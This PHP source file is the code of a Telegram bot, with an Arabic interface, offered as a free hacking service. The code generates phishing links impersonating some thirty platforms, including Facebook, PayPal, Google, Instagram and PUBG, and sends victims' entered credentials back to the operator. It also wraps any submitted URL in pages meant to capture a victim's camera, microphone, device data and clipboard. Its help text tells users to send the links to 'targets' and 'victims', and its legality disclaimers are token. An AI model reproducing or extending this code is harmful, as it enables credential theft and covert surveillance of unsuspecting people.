<?php
#=========================

#========/start=======#
if($text == "/start"){
unlink("database/$chat_id/database.txt");
bot('sendMessage', [
    'chat_id' => $chat_id,
    'text' => "**مرحبا في بوت king اختراق مجاني** 
  
   - اهلا بك عزيزي  ($name) 

- في بوت صنع روابط اختراق مجاني وسريع

- شخص يقوم بدخول على رابط خاص بك

- سوف تصل جميع معلوماته لك على البوت  الخاص بنا البوت آمن ومجاني",
    'parse_mode' => "Markdown",
    'disable_web_page_preview' => true,
    'reply_markup' => json_encode([
        'inline_keyboard' => [
            [
                ['text' => 'اختراق حسابات التواصل  🚀', 'callback_data' => 'index'],
                ['text' => '🎭انشاء رابط ملغم ☠️', 'callback_data' => 'exit1']
            ],
            [
                ['text' => 'اختصار روابط', 'web_app' => ['url' => 'https://m-r.pw/']]
            ],
            [
                ['text' => '- شرح البوت', 'callback_data' => 'help']
            ],
            [
                ['text' => 'تعليمات البوت ⚠️', 'callback_data' => 'no'],
                ['text' => 'مطور البوت ', 'url' => 'https://t.me/z_iik']
            ],
            [
                ['text' => 'بوت هكر مجاني', 'url' => 'https://t.me/z_iik']
                ]
        ]
    ])
]);

}
#========index=======#
if ($data == "index") {
    bot('editMessageText', [
        'chat_id' => $chat_id2,
        'message_id' => $message_id,
        'text' => '🌟 **اختار المنصه الي تود اختراقها!** 

سيقوم البوت بصنع رابط ملغم خاص بهذه المنصة وإرساله لك مباشرة في الشات.',
        'parse_mode' => "Markdown",
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [['text' => '🎮 بوبجي', 'callback_data' => 'pubg'], ['text' => '🎮 بوبجي2', 'callback_data' => 'spin'], ['text' => '🎮 بوبجي3', 'callback_data' => 'midasbuy']],
                [['text' => '🅰 Adobe', 'callback_data' => 'adobe'], ['text' => '📘 فيس بوك', 'callback_data' => 'facebook'], ['text' => '💬 Discord', 'callback_data' => 'discord']],
                [['text' => '💸بايبال', 'callback_data' => 'paypal'], ['text' => '🎬 Netflix', 'callback_data' => 'netflix'], ['text' => '📷 انستجرام', 'callback_data' => 'instagram']],
                [['text' => '🔍جوجل', 'callback_data' => 'google'], ['text' => '🔍 جوجل 2', 'callback_data' => 'google_new'], ['text' => '❤️ Badoo', 'callback_data' => 'badoo']],
                [['text' => '💬ميسجر', 'callback_data' => 'fb_messenger'], ['text' => '🐱 GitHub', 'callback_data' => 'github'], ['text' => '🦊 GitLab', 'callback_data' => 'gitlab']],
                [['text' => '🛒 eBay', 'callback_data' => 'ebay'], ['text' => '🎨 DeviantArt', 'callback_data' => 'deviantart'], ['text' => '👥 IG Followers', 'callback_data' => 'ig_followers']],
                [['text' => '📁 MediaFire', 'callback_data' => 'mediafire'], ['text' => '🛰 Yandex', 'callback_data' => 'yandex'], ['text' => '🎵تيك توك', 'callback_data' => 'tiktok']],
                [['text' => '🐦تويتر', 'callback_data' => 'twitter'], ['text' => '📺 Twitch', 'callback_data' => 'twitch'], ['text' => '🌐 WordPress', 'callback_data' => 'wordpress']],
                [['text' => '🎮 Roblox', 'callback_data' => 'roblox'], ['text' => '👻سناب شات', 'callback_data' => 'snapchat'], ['text' => '💻 ميكروسوفت', 'callback_data' => 'microsoft']],
                [['text' => '🎵 Spotify', 'callback_data' => 'spotify'], ['text' => '🔥فري فاير', 'callback_data' => 'freefire'], ['text' => '🔥 فري فاير2', 'callback_data' => 'freefire2']],
                [['text' => '✥ عودة ↩ ٭', 'callback_data' => 'exit']]
            ]
        ])
    ]);
}

// استقبال ضغطات أزرار قسم "حسابات التواصل" وإرسالها كرسائل في الشات
$platforms = [
    'pubg' => ['name' => 'بوبجي 🎮', 'path' => 'GLACIER(PUBG)'],
    'spin' => ['name' => 'بوبجي2 🎮', 'path' => 'SPIN'],
    'midasbuy' => ['name' => 'بوبجي3 🎮', 'path' => 'MIDASBUY(OLDxPUBG)'],
    'adobe' => ['name' => 'Adobe 🅰', 'path' => 'adobe'],
    'facebook' => ['name' => 'فيس بوك 📘', 'path' => 'facebook'],
    'discord' => ['name' => 'Discord 💬', 'path' => 'discord'],
    'paypal' => ['name' => 'بايبال 💸', 'path' => 'paypal'],
    'netflix' => ['name' => 'Netflix 🎬', 'path' => 'netflix'],
    'instagram' => ['name' => 'انستجرام 📷', 'path' => 'instagram'],
    'google' => ['name' => 'جوجل 🔍', 'path' => 'google'],
    'google_new' => ['name' => 'جوجل 2 🔍', 'path' => 'google_new'],
    'badoo' => ['name' => 'Badoo ❤️', 'path' => 'badoo'],
    'fb_messenger' => ['name' => 'ميسجر 💬', 'path' => 'fb_messenger'],
    'github' => ['name' => 'GitHub 🐱', 'path' => 'github'],
    'gitlab' => ['name' => 'GitLab 🦊', 'path' => 'gitlab'],
    'ebay' => ['name' => 'eBay 🛒', 'path' => 'ebay'],
    'deviantart' => ['name' => 'DeviantArt 🎨', 'path' => 'deviantart'],
    'ig_followers' => ['name' => 'IG Followers 👥', 'path' => 'ig_followers'],
    'mediafire' => ['name' => 'MediaFire 📁', 'path' => 'mediafire'],
    'yandex' => ['name' => 'Yandex 🛰', 'path' => 'yandex'],
    'tiktok' => ['name' => 'تيك توك 🎵', 'path' => 'tiktok'],
    'twitter' => ['name' => 'تويتر 🐦', 'path' => 'twitter'],
    'twitch' => ['name' => 'Twitch 📺', 'path' => 'twitch'],
    'wordpress' => ['name' => 'WordPress 🌐', 'path' => 'wordpress'],
    'roblox' => ['name' => 'Roblox 🎮', 'path' => 'roblox'],
    'snapchat' => ['name' => 'سناب شات 👻', 'path' => 'snapchat'],
    'microsoft' => ['name' => 'ميكروسوفت 💻', 'path' => 'microsoft'],
    'spotify' => ['name' => 'Spotify 🎵', 'path' => 'spotify'],
    'freefire' => ['name' => 'فري فاير 🔥', 'path' => 'FREEFIRE'],
    'freefire2' => ['name' => 'فري فاير2 🔥', 'path' => 'FREEFIRE2']
];

if (array_key_exists($data, $platforms)) {
    $p_info = $platforms[$data];
    bot('sendMessage', [
        'chat_id' => $chat_id2,
        'text' => "🔗 **رابط صفحة (" . $p_info['name'] . ") الخاص بك:**\n\n" .
                  "`$brokweb/" . $p_info['path'] . "/?ID=$chat_id2`\n\n" .
                  "انسخ الرابط وأرسله للمستهدف.",
        'parse_mode' => "Markdown"
    ]);
}

#=========help========#
if($data == "help"){
bot('editMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>'⚠️ **تعليمات استخدام بوت اختراق مجاني** ⚠️

مرحبًا بك في بوت king اختراق مجاني  لإتمام تجربتك بأفضل شكل ممكن، نوصيك باتباع التعليمات التالية:

1. **البدء** 🚀:
   - لبدء استخدام البوت، أرسل الأمر `/start` أو انقر على زر "قسم الخدمات" في القائمة الرئيسية.
  
2. **اختراق حسابات التواصل  ** 🛠️:
   - اختر خيار "اختراق حسابات التواصل " من القائمة.
   - اختر نوع المنصه  المراد إرساله مع المستهدفين
- سيتم إنشاء رابط خاص اختراق  يمكنك مشاركته مع المستهدفين.

3. **تلقي التنبيهات** 🔔:
   - ستتلقى إشعارات فورية على البوت عند قيام أي شخص بالتسجيل في الرابط الخاص بك.
   - تتضمن الإشعارات جميع البيانات المدخلة من قبل المستخدمين، مما يمكنك من متابعة وتحليل النتائج بسهولة. يالك من شرير 

4. **الأمان والخصوصية** 🔒:
   - تأكد من استخدام الروابط الخاصة بك بحذر وعدم مشاركتها إلا مع الأشخاص المستهدفين.
   - نوصي بعدم استخدام الاختراقات لأغراض غير قانونية أو لإيذاء الآخرين.

5. **المساعدة والدعم** 🆘:
   - في حال واجهت أي مشكلة أو كنت بحاجة إلى مساعدة، يمكنك الوصول إلى خيار "الدعم الفني" @z_iik للحصول على المساعدة الفورية.
   
6. **مشاركة البوت** 🤝:
   - شارك البوت مع أصدقائك ومعارفك عبر خيار "شارك البوت" لتمكينهم من الاستفادة من خدماته.

باستخدامك لبوت الاختراق  يمكنك الاختراق  بسهولة إنشاء وإدارة صفحات التسجيل المزورة بكفاءة وأمان. اتبع التعليمات بعناية لضمان تحقيق أفضل النتائج. إذا كان لديك أي استفسار، لا تتردد في طلب المساعدة. شكراً لاستخدامك بوت الاختراق المجاني!',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>'حسناا','callback_data'=>'exit']]    
]    
])
]);
}
#=========no=========#
if($data == "no"){
bot('editMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>'
📜 **قوانين استخدام بوت الاختراق** 📜

لضمان تجربة آمنة وسلسة لجميع مستخدمينا، يرجاء الالتزام بالقوانين التالية عند استخدام الاختراق المجاني:

1. **الاستخدام القانوني** ⚖️:
   - يجب استخدام البوت لأغراض قانونية فقط. يُمنع استخدام البوت لأي أنشطة غير قانونية أو ضارة.اني اخاف الله ♥
   - يحظر استخدام البوت لجمع بيانات المستخدمين بدون موافقتهم الصريحة.

2. **الخصوصية والأمان** 🔒:
   - يجب على المستخدمين الحفاظ على سرية روابط الاختراق وعدم مشاركتها إلا مع الأشخاص المستهدفين بشكل آمن.
   - يمنع نشر أو مشاركة أي معلومات شخصية تم جمعها من خلال البوت الخاص بنا  مع أطراف ثالثة بدون موافقة صريحة من أصحاب البيانات.

3. **الاحترام والأخلاق** 🌟:
   - يُمنع استخدام البوت لنشر أو توزيع محتوى مسيء، غير أخلاقي، أو يحض على الكراهية بأي شكل من الأشكال.
   - يجب التعامل مع جميع المستخدمين والزملاء باحترام واحترافية.

4. **الالتزام بالشروط** 📋:
   - يجب الالتزام بجميع الشروط والأحكام الخاصة البوت كما هي مذكورة في الوثائق الرسمية.
   - يُمنع استخدام البوت بطرق تتعارض مع شروط الخدمة الخاصة بتليجرام.

5. **حماية الحساب** 🔐:
   - يُنصح المستخدمون بتأمين حساباتهم الشخصية وعدم مشاركة تفاصيل الدخول مع أي شخص آخر.
   - يجب الإبلاغ فورًا عن أي نشاط مشبوه أو محاولات غير مصرح بها للوصول إلى الحساب.

6. **الإبلاغ عن الأخطاء** 🛠️:
   - في حالة اكتشاف أي أخطاء أو ثغرات في البوت، يُرجى الإبلاغ عنها لفريق الدعم الفني فورًا لتفادي استغلالها.
   - يُمنع محاولة استغلال أو إساءة استخدام أي أخطاء أو ثغرات في النظام.

7. **الاستخدام العادل** ⚙️:
   - يجب استخدام البوت بشكل يتوافق مع سياسة الاستخدام العادل، وتجنب أي محاولات لإساءة استخدام الموارد المتاحة.
   - يُمنع استخدام البرامج الآلية أو أي وسائل غير مصرح بها للوصول إلى البوت أو التفاعل معه.

---

نحن نقدر التزامكم بهذه القوانين لضمان بيئة آمنة وموثوقة للجميع. انتهاك أي من هذه القوانين قد يؤدي إلى إيقاف أو حظر حسابك. شكراً لتفهمكم وتعاونكم.

إذا كان لديكم أي استفسارات أو تحتاجون إلى مزيد من المعلومات، يُرجى التواصل مع فريق الدعم الفني. @z_iik
',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>'حسناا','callback_data'=>'exit']]    
]    
])
]);
}
#=========exit========#
if($data == "exit"){

bot('editMessageText', [
    'chat_id' => $chat_id2,
    'message_id' => $message_id,
    'text' => "🤖✨ **مرحبا في بوت king اختراق مجاني** 
    
   - اهلا بك عزيزي  ($name_user) 

- في بوت صنع روابط اختراق مجاني وسريع

- شخص يقوم بدخول على رابط خاص بك

- سوف تصل جميع معلوماته لك على بوت الخاص بنا البوت مجاني وآمن.",
    'parse_mode' => "Markdown",
    'disable_web_page_preview' => true,
    'reply_markup' => json_encode([
        'inline_keyboard' => [
            [
                ['text' => 'اختراق حسابات التواصل 🚀', 'callback_data' => 'index'],
                ['text' => '🎭انشاء رابط ملغم ☠️', 'callback_data' => 'exit1']
            ],
            [
                ['text' => 'اختصار روابط', 'web_app' => ['url' => 'https://m-r.pw/']]
            ],
            [
                ['text' => '- شرح البوت', 'callback_data' => 'help']
            ],
            [
                ['text' => 'تعليمات البوت ⚠️', 'callback_data' => 'no'],
                ['text' => 'مطور البوت', 'url' => 'https://t.me/z_iik']
            ],
            [
                ['text' => 'بوت هكر مجاني', 'url' => 'https://t.me/z_iik']
            ]
        ]
    ])
]);

}
//========== وضع صيانة ============
if ($data == "exit1") {
   file_put_contents("database/$chat_id2/database.txt", "url");
    bot('editMessageText', [
        'chat_id' => $chat_id2,
        'message_id' => $message_id,
        'text' => "☠️ قم بارسال الرابط المراد تلغيمه

سيتم إنشاء روابط ملغمه كل رابط مصمم لسحب بينات بسهوله

🔗 هناك روابط لا يمكن تلغيمها  وقد تم حظر بعض الموقع 
رابط جاهز قم بإرساله للبوت ليتم تلغيمه 👇

 https://YouTube.com   او رابط آخر ليتم تلغيمه ",
        'parse_mode' => "Markdown",
        'disable_web_page_preview' => true,
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [['text' => 'رجوع', 'callback_data' => 'exit']]
            ]
        ])
    ]);
}
//===================================
$database = file_get_contents("database/$chat_id/database.txt");
// التحقق من الرابط وإجراء العمليات المطلوبة
if ($text and $database == "url") {

    // التحقق من صحة الرابط
    if (filter_var($text, FILTER_VALIDATE_URL) === false) {
        bot('sendMessage', [
            'chat_id' => $chat_id,
            'text' => "⚠️ الرابط غير صحيح. يرجى إدخال رابط صحيح."
        ]);
        return;
    }

    $linkFile = 'link.txt';
    $urlFile = 'url.txt';
    $linkExists = false;
    $link = '';

    // التحقق مما إذا كان الرابط موجودًا في link.txt
if (file_exists($linkFile)) {
    $links = file($linkFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $parsedTextUrl = parse_url($text);
    $textDomain = isset($parsedTextUrl['host']) ? $parsedTextUrl['host'] : '';

    foreach ($links as $line) {
        $parsedLineUrl = parse_url(trim($line));
        $lineDomain = isset($parsedLineUrl['host']) ? $parsedLineUrl['host'] : '';

        if ($textDomain === $lineDomain) {
            $linkExists = true;
            break;
        }
    }
}

if ($linkExists) {
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "🚫 الرابط محظور."
    ]);
    return false;
}else {
        // التحقق من وجود الرابط في url.txt
        if (file_exists($urlFile)) {
            $urls = file($urlFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            if (in_array($text, $urls)) {
                $lineNumber = array_search($text, $urls) + 1; // إيجاد رقم السطر الذي يحتوي على الرابط
                $link = $lineNumber; // تعيين رقم السطر إلى المتغير $link
            } else {
                // إضافة الرابط إلى الملف
                file_put_contents($urlFile, $text . PHP_EOL, FILE_APPEND);
                // تحديث رقم السطر بعد إضافة الرابط
                $lineNumber = count($urls) + 1;
                $link = $lineNumber; // تعيين رقم السطر إلى المتغير $link
            }
        } else {
            bot('sendMessage', [
                'chat_id' => $chat_id,
                'text' => "حدث خطاء البوت في وضع صيانه ⛔"
            ]);
            return false;
        }
    }

    // إرسال رسالة للمستخدم بعد التحقق من الرابط (أصلية كما طلبتها دون تعديل)
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "🌟 اختر صفحة الملغمه التي  تناسب احتياجاتك!

ستجد مجموعة متنوعة من الصفحات الجاهزة التي تمكنك من جمع البيانات بسهولة. كل صفحة مصممة بعناية لتلبية متطلباتك الخاصة.

📄🔗 انقر نقرة مطولة على الزر لنسخ الرابط بعد نسخ الرابط المحدد من الازرار قم برساله لضحيه لاختراق الشي المحدد",
        'parse_mode' => "Markdown",
        'disable_web_page_preview' => true,
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [['text' => 'اختراق الكاميرا 📽 ', 'url' => "$brokweb/com/?ID=$chat_id&link=$link"],
                 ['text' => ' اختراق الهاتف 📲', 'url' => "$brokweb/mode/?ID=$chat_id&link=$link"]],
                [['text' => '🎧اختراق الصوت', 'url' => "$brokweb/mic/?ID=$chat_id&link=$link"],                                                                  ['text' => 'اختراق الحافظة 📋', 'url' => "$brokweb/copy/?ID=$chat_id&link=$link"]],
                 
                [['text' => '↩ عودة', 'callback_data' => 'exit']]
            ]
        ])
    ]);
}
?>
